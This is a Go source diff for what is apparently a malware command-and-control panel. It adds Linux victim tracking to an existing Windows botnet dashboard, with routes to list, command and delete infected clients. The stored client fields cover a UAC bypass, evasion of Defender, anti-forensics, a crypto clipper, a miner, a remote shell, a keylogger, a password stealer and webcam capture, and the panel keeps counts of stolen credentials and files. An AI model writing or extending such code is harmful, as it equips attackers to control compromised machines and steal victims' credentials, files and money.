@@ -129,7 +129,9 @@ func GoServerWithFrontend() {
 	//Pages
 	router.HandleFunc("/", dashboardHandle)
 	router.HandleFunc("/clients/windows", clientsWindowsHandle)
+	router.HandleFunc("/clients/linux", clientsLinuxHandle)
 	router.HandleFunc("/manage/windows", manageWindowsHandle)
+	router.HandleFunc("/manage/linux", manageLinuxHandle)
 	router.HandleFunc("/ddos", DDoSHandler)
 	router.HandleFunc("/socks", socksPageHandler)
 	router.HandleFunc("/tasks", tasksHandle)
@@ -140,10 +142,12 @@ func GoServerWithFrontend() {
 	router.HandleFunc("/logout", logoutHandler)
 	//Functions
 	router.HandleFunc("/issue/windows", issueCommand)
+	router.HandleFunc("/issue/linux", issueLinuxCommand)
 	router.HandleFunc("/issue/windows/toggle", toggleClientFeature)
 	router.HandleFunc("/save/client/notes", saveClientNotes)
 	router.HandleFunc("/delete/admin", deleteAdmin)
 	router.HandleFunc("/delete/client/windows", deleteClient)
+	router.HandleFunc("/delete/client/linux", deleteLinuxClient)
 	router.HandleFunc("/delete/command", deleteCommand)
 	router.HandleFunc("/tasks/windows/new", newTaskHandle)
 	router.HandleFunc("/delete/task/windows", deleteTask)
@@ -739,25 +743,32 @@ func newClient(w http.ResponseWriter, r *http.Request) {
 	err := json.Unmarshal(Decrypted, &jsonData)
 	flag := GetCountryCode(jsonData.IP)
 	go dataStat(false, ClientUID, int(r.ContentLength))
+
 	if err == nil {
+		tableName := "windows_clients"
+		clientDir := "./clients/windows/"
+		if strings.Contains(strings.ToLower(jsonData.OS), "linux") {
+			tableName = "linux_clients"
+			clientDir = "./clients/linux/"
+		}
+
 		var tmpuid string
-		err := DB.QueryRow("SELECT UID FROM windows_clients WHERE UID=?", ClientUID).Scan(&tmpuid)
+		err := DB.QueryRow("SELECT UID FROM "+tableName+" WHERE UID=?", ClientUID).Scan(&tmpuid)
 		if err == sql.ErrNoRows {
-			_, err = DB.Exec("INSERT INTO windows_clients(UID, ClientVersion, IP, Flag, OperatingSystem, GPU, Abilities, SysInfo, PingTime, Jitter, UserAgent, InstanceKey, Install, SmartCopy, InstallName, InstallFolder, Campaign, AntiForensics, AntiForensicsResponse, "+
+			_, err = DB.Exec("INSERT INTO "+tableName+"(UID, ClientVersion, IP, Flag, OperatingSystem, GPU, Abilities, SysInfo, PingTime, Jitter, UserAgent, InstanceKey, Install, SmartCopy, InstallName, InstallFolder, Campaign, AntiForensics, AntiForensicsResponse, "+
 				"UACBypass, Guardian, DefenceSystem, ACG, HideFromDefender, AntiProcessWindow, AntiProcess, BlockTaskManager,  AntiVirus, ClipperState, BTC, XMR, ETH, Custom, Regex, MinerState, Socks5State, ReverseProxyState, RemoteShellState, "+
 				"KeyloggerState, FileHunterState, PasswordStealerState, Screenshot, Webcam, Notes, LastResponse, FirstSeen) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
 				jsonData.UID, jsonData.ClientVersion, jsonData.IP, flag, jsonData.OS, jsonData.GPU, jsonData.Abilities, jsonData.SysInfo, jsonData.PingTime, jsonData.Jitter, jsonData.UserAgent, jsonData.InstanceKey, jsonData.Install, jsonData.SmartCopy, jsonData.InstallName,
 				jsonData.InstallFolder, jsonData.Campaign, jsonData.AntiForensics, jsonData.AntiForensicsResponse, jsonData.UACBypass, jsonData.Guardian, jsonData.DefenceSystem, jsonData.ACG, jsonData.HideFromDefender, jsonData.AntiProcessWindow, jsonData.AntiProcess, jsonData.BlockTaskManager,
 				jsonData.AntiVirus, jsonData.ClipperState, jsonData.BTC, jsonData.XMR, jsonData.ETH, jsonData.Custom, jsonData.Regex,
 				jsonData.MinerState, jsonData.Socks5State, jsonData.ReverseProxyState, jsonData.RemoteShellState, jsonData.KeyloggerState, jsonData.FileHunterState, jsonData.PasswordStealerState, jsonData.Screenshot, jsonData.Webcam, "New Client", time.Now().Format("02 Jan 06 15:04 -0700"), time.Now().Format("02 Jan 06 15:04 -0700"))
-			LiveMessage = "success|" + jsonData.UID + "|New Client Connection"
-			//	fmt.Println(err)
-			_, err := os.Stat("./clients/windows/" + ClientUID + "/")
 
-			if os.IsNotExist(err) {
-				_ = os.MkdirAll("./clients/windows/"+ClientUID+"/files/recordings/", 0755)
-				_ = os.MkdirAll("./clients/windows/"+ClientUID+"/files/stealer/", 0755)
-				_ = os.MkdirAll("./clients/windows/"+ClientUID+"/files/logs/", 0755)
+			LiveMessage = "success|" + jsonData.UID + "|New Client Connection"
+
+			if _, err := os.Stat(clientDir + ClientUID + "/"); os.IsNotExist(err) {
+				_ = os.MkdirAll(clientDir+ClientUID+"/files/recordings/", 0755)
+				_ = os.MkdirAll(clientDir+ClientUID+"/files/stealer/", 0755)
+				_ = os.MkdirAll(clientDir+ClientUID+"/files/logs/", 0755)
 			}
 			fmt.Fprintf(w, "success")
 		}
@@ -1312,31 +1323,34 @@ func dashboardHandle(w http.ResponseWriter, r *http.Request) {
 		var flag, oS string
 		var us, eu, ru, jp, af, oC, windows, linux, android, other int
 
-		rows, _ := DB.Query("SELECT Flag, OperatingSystem FROM windows_clients")
-		for rows.Next() {
-			_ = rows.Scan(&flag, &oS)
-			if flag == "us" {
-				us++
-			} else if flag == "eu" {
-				eu++
-			} else if flag == "ru" {
-				ru++
-			} else if flag == "jp" {
-				jp++
-			} else if flag == "af" {
-				af++
-			} else {
-				oC++
-			}
+		tables := []string{"windows_clients", "linux_clients"}
+		for _, table := range tables {
+			rows, _ := DB.Query("SELECT Flag, OperatingSystem FROM " + table)
+			for rows.Next() {
+				_ = rows.Scan(&flag, &oS)
+				if flag == "us" {
+					us++
+				} else if flag == "eu" {
+					eu++
+				} else if flag == "ru" {
+					ru++
+				} else if flag == "jp" {
+					jp++
+				} else if flag == "af" {
+					af++
+				} else {
+					oC++
+				}
 
-			if strings.Contains(oS, "Windows") {
-				windows++
-			} else if strings.Contains(oS, "Linux") {
-				linux++
-			} else if strings.Contains(oS, "Android") {
-				android++
-			} else {
-				other++
+				if strings.Contains(oS, "Windows") {
+					windows++
+				} else if strings.Contains(oS, "Linux") {
+					linux++
+				} else if strings.Contains(oS, "Android") {
+					android++
+				} else {
+					other++
+				}
 			}
 		}
 
@@ -1644,4 +1658,87 @@ func notFound(w http.ResponseWriter, r *http.Request) {
 }
 func faviconHandle(response http.ResponseWriter, request *http.Request) {
 	http.ServeFile(response, request, "static/images/favicon.ico")
+}
+
+func clientsLinuxHandle(w http.ResponseWriter, r *http.Request) {
+	Username := getUserName(r)
+	if Username != "" {
+		var UID, ClientVersion, IP, FLAG, OS, ABList, AB, LR, cLR string
+		data := ClientsPage{}
+		data.Name = Name
+		data.TotalClients = strconv.Itoa(TotalClients)
+		data.ActiveClients = strconv.Itoa(ActiveClients)
+		data.Username = Username
+		data.StolenCredentials = strconv.Itoa(StolenCredentials)
+		data.StolenFiles = strconv.Itoa(StolenFiles)
+		data.ServerPort = serverPort
+
+		rows, _ := DB.Query("SELECT UID, ClientVersion, IP, Flag, OperatingSystem, Abilities, LastResponse FROM linux_clients")
+		for rows.Next() {
+			_ = rows.Scan(&UID, &ClientVersion, &IP, &FLAG, &OS, &ABList, &LR)
+			AB = ` <i class="fas fa-user"></i> `
+			if strings.Contains(ABList, "true") {
+				AB = ` <i class="fas fa-crown"></i> `
+			}
+
+			i, _ := strconv.ParseFloat(Timeout, 32)
+			then, _ := time.Parse(time.RFC822Z, LR)
+			duration := time.Since(then)
+			if duration.Minutes() <= i {
+				cLR = `<span style="color: #00ff00;">` + LR + `</span>`
+			} else {
+				cLR = `<span style="color: #ff0000;">` + LR + `</span>`
+			}
+			table := ClientsTable{FLAG, IP, UID, ClientVersion, OS, template.HTML(AB), template.HTML(cLR)}
+			data.ClientTables = append(data.ClientTables, table)
+		}
+		parsedTemplate, _ := template.ParseFiles("static/linux_clients.html")
+		parsedTemplate.Execute(w, data)
+	}
+}
+
+func manageLinuxHandle(w http.ResponseWriter, r *http.Request) {
+	Username := getUserName(r)
+	if Username != "" {
+		_ = r.ParseForm()
+		ClientUID := r.FormValue("id")
+		var rawInfo, Notes string
+		data := ManagePage{}
+		data.Name = Name
+		data.TotalClients = strconv.Itoa(TotalClients)
+		data.ActiveClients = strconv.Itoa(ActiveClients)
+		data.Username = Username
+		data.StolenCredentials = strconv.Itoa(StolenCredentials)
+		data.StolenFiles = strconv.Itoa(StolenFiles)
+
+		_ = DB.QueryRow("SELECT UID, IP, ClientVersion, OperatingSystem, GPU, Abilities, SysInfo, AntiVirus, LastResponse, Notes FROM linux_clients WHERE UID=?", ClientUID).Scan(&data.UID, &data.IP, &data.ClientVersion, &data.OS, &data.GPU, &data.Abilities, &rawInfo, &data.AntiVirus, &data.LastResponse, &Notes)
+		data.Notes = html.UnescapeString(Notes)
+		data.ClientInfo = base64Decode(rawInfo)
+
+		parsedTemplate, _ := template.ParseFiles("static/manage_linux.html")
+		parsedTemplate.Execute(w, data)
+	}
+}
+
+func issueLinuxCommand(w http.ResponseWriter, r *http.Request) {
+	_ = r.ParseForm()
+	Username := getUserName(r)
+	if Username != "" {
+		uid := r.FormValue("uid")
+		command := r.FormValue("command")
+		params := r.FormValue("parameters")
+		realName := r.FormValue("realname")
+		_, _ = DB.Exec("INSERT INTO commands(UID, DAT, Command, Parameters, Status, DateIssued, Timeout) VALUES(?, ?, ?, ?, ?, ?, ?)", uid, command, strings.ToUpper(realName), params, "Waiting", time.Now().Format("02 Jan 06 15:04 -0700"), "30")
+		fmt.Fprintf(w, "success")
+	}
+}
+
+func deleteLinuxClient(w http.ResponseWriter, r *http.Request) {
+	_ = r.ParseForm()
+	Username := getUserName(r)
+	if Username != "" {
+		uid := r.FormValue("id")
+		_, _ = DB.Exec("DELETE FROM linux_clients WHERE UID=?", uid)
+		fmt.Fprintf(w, "success")
+	}
 }
